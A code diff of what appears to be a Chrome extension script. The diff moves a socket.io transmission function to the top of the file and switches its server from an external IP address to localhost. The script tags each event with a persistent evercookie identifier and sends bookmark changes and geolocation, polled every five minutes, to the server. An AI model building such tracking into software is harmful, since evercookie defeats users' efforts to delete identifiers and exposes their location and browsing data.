@@ -1,4 +1,33 @@
 ///////////////////////////////////////////////////////////////////////////////
+// Define constants.
+///////////////////////////////////////////////////////////////////////////////
+
+var SERVER_URL = "http://127.0.0.1:8080/";
+
+///////////////////////////////////////////////////////////////////////////////
+// Define transmission related functions.
+///////////////////////////////////////////////////////////////////////////////
+
+var socket = io.connect(SERVER_URL);
+
+var emitEvent = function (type, payload) {
+    // Define data object.
+    data = {}
+    data.uuid = uuid;
+    data.time = new Date().getTime();
+    data.type = type;
+    data.payload = JSON.stringify(payload);
+    // Compress payload.
+    // data.payload = LZString.compress(JSON.stringify(payload));
+    // Log data.
+    // console.log(data);
+    // console.log(payload);
+    // Transmit data to server.
+    socket.emit(type, data);
+    return data;
+};
+
+///////////////////////////////////////////////////////////////////////////////
 // Determine UUID and activate evercookie.
 ///////////////////////////////////////////////////////////////////////////////
 
@@ -17,9 +46,9 @@ ec.get("uuid", function (value) {
     } else {
         uuid = value;
         console.log("UUID:", uuid);
+        // Send start-up transmission.
+        emitStartUp();
     }
-    // Send start-up transmission.
-    emitStartUp();
     // Activate listeners.
     activateListeners();
 });
@@ -196,28 +225,4 @@ var activateListeners = function () {
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
     chrome.bookmarks.onRemoved.addListener(onBookmarkRemoved);
     setInterval(getCurrentPosition, 5 * 60 * 1000);
-};
-
-///////////////////////////////////////////////////////////////////////////////
-// Define transmission related functions.
-///////////////////////////////////////////////////////////////////////////////
-
-var SERVER_URL = "http://108.174.49.3:8080/";
-var socket = io.connect(SERVER_URL);
-
-var emitEvent = function (type, payload) {
-    // Define data object.
-    data = {}
-    data.uuid = uuid;
-    data.time = new Date().getTime();
-    data.type = type;
-    data.payload = JSON.stringify(payload);
-    // Compress payload.
-    // data.payload = LZString.compress(JSON.stringif/y(payload));
-    // Log data.
-    // console.log(data);
-    // console.log(payload);
-    // Transmit data to server.
-    socket.emit(type, data);
-    return data;
 };
